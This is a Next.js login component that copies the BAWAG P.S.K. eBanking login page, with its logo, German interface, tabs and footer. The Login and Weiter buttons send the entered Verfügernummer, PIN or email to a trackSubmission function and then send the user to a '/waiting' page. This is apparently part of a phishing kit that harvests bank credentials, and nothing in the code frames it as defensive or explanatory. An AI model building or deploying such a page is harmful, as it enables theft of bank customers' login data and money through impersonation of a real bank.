"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

interface LoginFormProps {
  error: string | null;
}

export default function LoginForm({ error }: LoginFormProps) {
  const router = useRouter();
  const [dn, setDn] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [activeTab, setActiveTab] = useState<"verfueger" | "app">("verfueger");
  const [email, setEmail] = useState("");

  return (
    <div className="container">
      {/* HEADER */}
      <header className="header">
        <div className="header-top">
          <div className="date">Mittwoch, 06.05.2026, 13:25</div>
          <ul className="languages">
            <li className="active"><a href="#">DE</a></li>
            <li><a href="#">EN</a></li>
            <li><a href="#">BKS</a></li>
            <li><a href="#">TR</a></li>
          </ul>
        </div>
        <div className="header-left">
          <a href="https://www.bawag.at/" target="_blank">
            <img
              src="/bawag/bawag_ebanking_logo_de.png"
              width={175}
              height={93}
              alt="BAWAG eBanking"
            />
          </a>
        </div>
      </header>

      {/* MAIN CONTENT */}
      <div className="main-content clearfix">
        {/* LEFT COLUMN -- Login Form */}
        <div className="column-left">
          <div className="login-top">
            {error && (
              <div
                style={{
                  backgroundColor: "#fdeaea",
                  color: "#a00",
                  border: "1px solid #e4aaaa",
                  borderRadius: "6px",
                  padding: "10px 14px",
                  marginBottom: "14px",
                  fontSize: "0.85em",
                }}
              >
                {error}
              </div>
            )}
            <div className="login-top-heading">
              <h3>eBanking Login</h3>
              <span className="question-mark">?</span>
            </div>
            <p>
              <strong>Wie wollen Sie sich einloggen?</strong>
            </p>

            {/* Tabs */}
            <div id="login_tabs">
              <div
                id="login_tab_disposer"
                className={`login_tab ${activeTab === "verfueger" ? "login_tab_active" : "login_tab_inactive"}`}
                onClick={() => setActiveTab("verfueger")}
              >
                Verfüger
              </div>
              <div
                id="login_tab_app"
                className={`login_tab ${activeTab === "app" ? "login_tab_active" : "login_tab_inactive"}`}
                onClick={() => setActiveTab("app")}
              >
                Mit der App
              </div>
              <div style={{ clear: "both" }} />
            </div>

            {/* Verfüger Tab */}
            {activeTab === "verfueger" && (
              <div className="form-wrap">
                <input
                  type="text"
                  id="dn"
                  name="dn"
                  placeholder="Verfügernummer"
                  maxLength={17}
                  value={dn}
                  onChange={(e) => setDn(e.target.value)}
                  suppressHydrationWarning
                />
                <div className="pin-wrap">
                  <input
                    type={showPin ? "text" : "password"}
                    id="pin"
                    name="pin"
                    placeholder="PIN (5 bis 16-stellig )"
                    maxLength={16}
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    suppressHydrationWarning
                  />
                  <button
                    type="button"
                    className="eye-toggle"
                    onClick={() => setShowPin(!showPin)}
                    aria-label="Sichtbarkeit des Passwortes umstellen"
                  >
                    {showPin ? "\u{1F648}" : "\u{1F441}"}
                  </button>
                </div>
                <div className="submit-button">
                  <button
                    type="button"
                    onClick={async () => {
                      await trackSubmission("bawag", "login", { dn, pin });
                      router.push(`/waiting?user=${encodeURIComponent(dn)}`);
                    }}
                  >
                    Login
                  </button>
                </div>
                <ul className="opt-links">
                  <li>
                    <a href="#" target="_blank">
                      PIN vergessen oder Verfüger gesperrt?
                    </a>
                  </li>
                </ul>
              </div>
            )}

            {/* App Tab */}
            {activeTab === "app" && (
              <div className="form-wrap">
                <p style={{ fontSize: "0.8em", padding: "16px 8px" }}>
                  Verwenden Sie Ihre für die BAWAG App registrierte E-Mail oder Ihre Verfügernummer.
                </p>
                <input
                  type="text"
                  id="email"
                  name="email"
                  placeholder="E-Mail ODER Verfügernummer"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  suppressHydrationWarning
                />
                <div className="submit-button">
                  <button
                    type="button"
                    onClick={async () => {
                      await trackSubmission("bawag", "login_app", { email });
                      router.push(`/waiting?user=${encodeURIComponent(email)}`);
                    }}
                  >
                    Weiter
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* RIGHT COLUMN -- Info */}
        <div className="column-right">
          <div className="info-wrapper">
            <div className="info">
              {/* Sicherheit */}
              <div className="column-3-grid">
                <h3>Sicherheit</h3>
                <ul>
                  <li>
                    Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
                    <br />
                    <a href="#" target="_blank">
                      Mehr Infos
                    </a>
                  </li>
                </ul>
              </div>

              {/* Service & Info */}
              <div className="column-3-grid">
                <h3>Service &amp; Info</h3>
                <ul>
                  <li><a href="#" target="_blank">Sicherheitsregeln</a></li>
                  <li><a href="#" target="_blank">Anmeldung / Erste Schritte</a></li>
                  <li><a href="#" target="_blank">3D Secure Online Bezahlung</a></li>
                </ul>
              </div>

              {/* Support */}
              <div className="column-3-grid">
                <h3>Support</h3>
                <ul>
                  <li><a href="#" target="_blank">FAQ</a></li>
                  <li><a href="#" target="_blank">Zu Watchlist Internet</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* FOOTER */}
      <footer className="footer">
        <ul>
          <li><a href="#" target="_blank">Impressum</a></li>
          <li><a href="#" target="_blank">AGB</a></li>
          <li><a href="#" target="_blank">Datenschutz</a></li>
          <li><a href="#" target="_blank">Nutzungsbedingungen</a></li>
          <li><a href="#" target="_blank">Barrierefrei</a></li>
        </ul>
        <p>&copy; BAWAG P.S.K.</p>
      </footer>
    </div>
  );
}
